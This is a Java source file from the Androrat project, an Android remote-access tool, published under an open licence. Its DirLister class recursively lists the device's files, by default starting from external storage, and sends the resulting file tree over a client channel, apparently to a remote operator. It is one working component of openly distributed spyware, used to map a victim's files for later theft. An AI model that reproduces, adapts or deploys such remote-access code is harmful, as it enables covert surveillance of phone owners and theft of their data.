/*
  Part of the Androrat project - https://github.com/RobinDavid/androrat

  Copyright (c) 2012 Robin David

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation, version 3.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General
  Public License along with this library; if not, write to the
  Free Software Foundation, Inc., 59 Temple Place, Suite 330,
  Boston, MA  02111-1307  USA
*/
package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.activityclient.ClientListener;

import utils.MyFile;
import Packet.FileTreePacket;
import android.content.Context;
import android.os.Environment;

public class DirLister {
	
	public static boolean listDir(ClientListener c, int channel, String dirname) {
		File f;
		ArrayList<MyFile> ar = new ArrayList<MyFile>();
		
		if(dirname.equals("/"))
			f = Environment.getExternalStorageDirectory();
		else
			f = new File(dirname);
		
		if (!f.exists()) {
			return false;
		} 
		else {
			ar.add(visitAllDirsAndFiles(f));
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}
	
	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {

		if(dir.exists()) {
		    if (dir.isDirectory()) {
		        String[] children = dir.list();
		        ar.add(new MyFile(dir));
		        if(children != null) {
			        for (String child: children) {
			        	//System.out.println(dir.toString()+"/"+child);
			        	try {
			        		File f = new File(dir, child);
			        		visitAllDirsAndFiles(f, ar);
			        	}
			        	catch(Exception e) {
			        		System.out.println("Child !"+child);
			        		e.printStackTrace();
			        	}
			        }
		        }
		    }
		    else
		    	ar.add(new MyFile(dir));
		}
	}
	
	public static MyFile visitAllDirsAndFiles(File dir) {

		if(dir.exists()) {
		    if (dir.isDirectory()) {
		        String[] children = dir.list();
		        MyFile myf = new MyFile(dir);
		        //ar.add(new MyFile(dir));
		        if(children != null) {
		        	if(children.length != 0) {
				        for (String child: children) {
				        	//System.out.println(dir.toString()+"/"+child);
				        	try {
				        		File f = new File(dir, child);
				        		myf.addChild(visitAllDirsAndFiles(f));
				        	}
				        	catch(Exception e) {
				        		System.out.println("Child !"+child);
				        		e.printStackTrace();
				        	}
				        }
		        	}
		        }
	        	return myf;
		    }
		    else
		    	return new MyFile(dir);
		}
		return null;
	}
	
}
